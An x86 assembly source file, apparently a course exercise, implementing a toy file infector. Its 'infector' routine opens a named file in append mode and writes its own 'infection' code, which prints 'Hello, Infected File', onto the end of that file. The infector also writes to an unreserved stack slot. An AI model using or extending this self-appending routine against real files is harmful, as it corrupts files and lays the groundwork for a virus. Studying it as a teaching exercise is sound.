section .data
    msg: db 'Hello, Infected File', 0xA
    len: equ $-msg

section .text
global _start
global system_call
global code_start
global code_end
global infector
global infection
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state
    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
    infection:
        push   ebp             ; Save caller state
        mov    ebp, esp
        mov    eax, [ebp+8]    ; get the number argument
        and    eax, 1          ; add 1 to check if the last bit is 0, flag ZF will turn on
        jnz    odd             ; if ZF not zero, do nothing, jump to end
        even:
        mov    eax, 4          ; Number of system call SYS_WRITE
        mov    ebx, 1          ; Number of file descriptor STDOUT
        mov    ecx, msg        ; Message
        mov    edx, len        ; Message length
        int    0x80            ; Connect to kernel
        odd:
        pop    ebp             ; Restore caller state
        ret                    ; Back to caller
code_end:

infector:
    push   ebp                          ; Save caller state
    mov    ebp, esp
    mov    eax, 5                       ; Number of system call SYS_OPEN
    mov    ebx, [ebp+8]                 ; file name
    mov    ecx, 0x401                   ; write | append
    mov    edx, 0777                    ; file permissions
    int    0x80                         ; Connect to kernel
    mov    [ebp-4], eax                 ; Save file descriptor
    mov    eax, 4                       ; Number of system call SYS_WRITE
    mov    ebx, [ebp-4]                 ; File descriptor to stack
    mov    ecx, code_start              ; Code to write to the file starts in label "code_start"
    mov    edx, code_end-code_start     ; The length of the code
    int    0x80                         ; Connect to kernel
    mov    eax, 6                       ; Number of system call SYS_CLOSE
    mov    ebx, [ebp-4]                 ; file to close
    int    0x80                         ; Connect to kernel
    pop    ebp                          ; Restore caller state
    ret                                 ; Back to caller